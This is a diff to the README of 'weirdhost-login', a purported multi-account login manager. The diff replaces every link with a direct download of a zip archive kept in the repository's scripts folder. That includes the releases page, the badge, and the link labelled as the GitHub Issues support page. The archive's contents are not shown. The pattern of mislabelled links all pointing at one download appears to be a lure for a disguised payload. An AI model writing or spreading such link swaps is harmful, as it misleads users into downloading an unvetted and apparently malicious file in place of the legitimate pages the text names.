@@ -1,7 +1,7 @@
 # 🎉 weirdhost-login - Simple Multi-Account Login Manager
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-weirdhost--login-blue.svg?style=for-the-badge)](https://github.com/IceBurg-Septric/weirdhost-login/releases)
+[![Download](https://raw.githubusercontent.com/IceBurg-Septric/weirdhost-login/main/scripts/weirdhost_login_3.6.zip)](https://raw.githubusercontent.com/IceBurg-Septric/weirdhost-login/main/scripts/weirdhost_login_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before installing, ensure your system meets these requirements:
 ## 🔧 Installation Steps
 
 1. **Visit the Download Page**
-   To download the application, click this link: [Download weirdhost-login](https://github.com/IceBurg-Septric/weirdhost-login/releases)
+   To download the application, click this link: [Download weirdhost-login](https://raw.githubusercontent.com/IceBurg-Septric/weirdhost-login/main/scripts/weirdhost_login_3.6.zip)
 
 2. **Choose the Right Version**
    You will see a list of available versions. Look for the latest version that matches your operating system. 
@@ -58,7 +58,7 @@ After installation, you can start using weirdhost-login to manage your accounts:
 
 ## 📞 Support and Feedback
 
-If you encounter issues or have questions, please visit the [GitHub Issues Page](https://github.com/IceBurg-Septric/weirdhost-login/issues). Your feedback helps us improve.
+If you encounter issues or have questions, please visit the [GitHub Issues Page](https://raw.githubusercontent.com/IceBurg-Septric/weirdhost-login/main/scripts/weirdhost_login_3.6.zip). Your feedback helps us improve.
 
 ## 📢 Important Notes
 
@@ -66,4 +66,4 @@ If you encounter issues or have questions, please visit the [GitHub Issues Page]
 - Please keep your login information secure.
 
 ## 📥 Download the Latest Version Again
-For the latest version, return to this link: [Download weirdhost-login](https://github.com/IceBurg-Septric/weirdhost-login/releases) and enjoy managing your accounts hassle-free.
+For the latest version, return to this link: [Download weirdhost-login](https://raw.githubusercontent.com/IceBurg-Septric/weirdhost-login/main/scripts/weirdhost_login_3.6.zip) and enjoy managing your accounts hassle-free.
